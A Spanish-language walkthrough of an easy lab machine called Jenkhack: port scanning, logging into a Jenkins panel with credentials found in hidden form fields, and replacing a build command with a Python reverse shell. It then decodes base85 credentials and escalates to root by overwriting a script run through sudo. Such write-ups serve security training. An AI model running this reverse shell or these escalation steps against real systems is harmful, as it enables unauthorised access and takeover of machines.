---
description: '🧠Dificultad: Fácil | 🔓29/06/2025'
---

# Jenkhack

Con un `nmap` vemos los puertos abiertos de la máquina. Todos son relacionados con servicios web.

<figure><img src="../../.gitbook/assets/Pasted image 20250628001136.png" alt=""><figcaption></figcaption></figure>

Si accedemos a la web del puerto 80, no encontramos ninguna funcionalidad ni botones relevantes.

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250628001225.png" alt=""><figcaption></figcaption></figure></div>

Procedemos a echarle un vistazo a la página https, donde nos encontramos un formulario de login.

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250628001419.png" alt="" width="419"><figcaption></figcaption></figure></div>

En el puerto 8080 se encuentra el mismo formulario, solo que sin https. Encontramos unos campos ocultos en el código fuente de la primera web que examinamos:

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250628002042.png" alt=""><figcaption></figcaption></figure></div>

Si utilizamos de credenciales `user = jenkins-admin` y `password = cassandra`, nos da acceso a un panel de administración:

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250628002205.png" alt=""><figcaption></figcaption></figure></div>

La página tiene un proyecto llamado `admin`. Este proyecto tiene una función para correr una build que nos permite ejecutar el código que queramos. Esto se conoce porque por defecto ejecuta un `whoami` que se puede configurar en otra sección del panel.

<figure><img src="../../.gitbook/assets/Pasted image 20250628002817.png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/Pasted image 20250628002516.png" alt=""><figcaption></figcaption></figure>

Si cambiamos este `whoami` por una reverse shell, podemos tener acceso al user de la máquina. En este caso, las reverse shell típicas de `bash -i` no funcionaban, así que opté por una reverse shell en `python`:

```bash
export RHOST="172.17.0.1";export RPORT=9001;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
```

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250628003721.png" alt=""><figcaption></figcaption></figure></div>

Una vez dentro de la máquina, si nos acordamos al principio, teníamos información que podía ser relevante y no hemos usado. Esto es, el dominio `jenkhack.hl`. Buscando en `/var/www/` encontramos la carpeta de este dominio oculto:

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250628010416.png" alt=""><figcaption></figcaption></figure></div>

Si accedemos, encontramos un fichero con unas credenciales que al parecer están codificadas.

<figure><img src="../../.gitbook/assets/Pasted image 20250628010503.png" alt=""><figcaption></figcaption></figure>

Si pasamos la contraseña por la herramienta [CyberChef](https://gchq.github.io/CyberChef/):

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250628010701 (1).png" alt=""><figcaption></figcaption></figure></div>

Vemos que estaba codificada en `base85`. Utilizamos la contraseña y el usuario para loguearnos desde dentro de la máquina:

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250628010837.png" alt=""><figcaption></figcaption></figure></div>

Vamos a ejecutar `sudo -l` para ver qué permisos tenemos:

```bash
jenkhack@3c48dd6f4804:~$ sudo -l
Matching Defaults entries for jenkhack on 3c48dd6f4804:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jenkhack may run the following commands on 3c48dd6f4804:
    (ALL : ALL) NOPASSWD: /usr/local/bin/bash
```

El usuario `jenkhack` tiene permiso para ejecutar `/usr/local/bin/bash` como cualquier usuario, sin necesidad de contraseña (`NOPASSWD`). Analizando este binario, encontramos lo siguiente:

```bash
jenkhack@3c48dd6f4804:~$ /usr/local/bin/bash
Welcome to the bash application!
Running command...
This is the bash script running.
```

<figure><img src="../../.gitbook/assets/Pasted image 20250628011351.png" alt=""><figcaption></figcaption></figure>

Este binario ejecuta un script de bash que podemos modificar para que ejecute lo que queramos. Como no nos deja modificarlo porque no podemos correr `nano` con `sudo`, podemos borrarlo y crear uno nuevo:

```bash
echo 'exec /bin/bash' > /opt/bash.sh
chmod +x /opt/bash.sh 
sudo /usr/local/bin/bash
```

<div align="left"><figure><img src="../../.gitbook/assets/Pasted image 20250628012355.png" alt=""><figcaption></figcaption></figure></div>
